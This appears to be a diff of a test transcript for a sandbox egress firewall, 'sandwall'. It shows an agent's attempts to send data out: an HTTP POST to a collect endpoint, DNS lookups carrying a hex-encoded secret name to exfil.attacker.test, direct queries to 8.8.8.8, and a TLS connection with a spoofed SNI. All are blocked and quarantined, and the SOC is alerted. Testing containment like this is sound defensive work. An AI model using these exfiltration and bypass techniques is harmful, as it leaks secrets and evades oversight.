@@ -34,8 +34,8 @@ agent: HTTP POST http://10.99.0.1:8080/collect failed: <urlopen error timed out>
 agent: DNS lookup of 4f50454e41495f4150...exfil.attacker.test failed: [Errno -3] Temporary failure in name resolution
 => nothing left the sandbox
 sandwall logs agent --deny-only:
-    16:39:53.593  deny  deny/not_allowed  tcp 10.99.0.1:8080
-    16:39:58.598  dns  refused/not_allowlisted  A 4f50454e41495f4150...exfil.attacker.test.
+    16:39:53.593  deny  deny/not_allowed  tcp 10.99.0.1:8080  (x5)
+    16:39:58.598  dns  refused/not_allowlisted  A 4f50454e41495f4150...exfil.attacker.test.  (x2)
 
 == the agent can still do its job
     curl https://pypi.org/simple/requests/ -> 200
@@ -46,7 +46,7 @@ agent: TLS to pypi.org's address with SNI exfil.attacker.test failed: [Errno 104
 sandwall logs agent --deny-only (new lines):
     16:39:59.734  deny  deny/dns_bypass  udp 8.8.8.8:53
     16:40:02.771  relay  deny/sni_mismatch  tcp 151.101.192.223:443 sni=exfil.attacker.test
-    16:40:02.803  quarantine  quarantined/auto: 2 x dns_bypass|sni_mismatch|host_mismatch within 1m0s (last: sni_mismatch exfil.attacker.test)
+    16:40:02.803  quarantine  quarantined/auto: 2 x dns_bypass|sni_mismatch|host_mismatch within 1m0s
 webhook soc received (signature checked):
     signature ok   deny/dns_bypass x1
     signature ok   quarantine/quarantined x1, relay/sni_mismatch x1
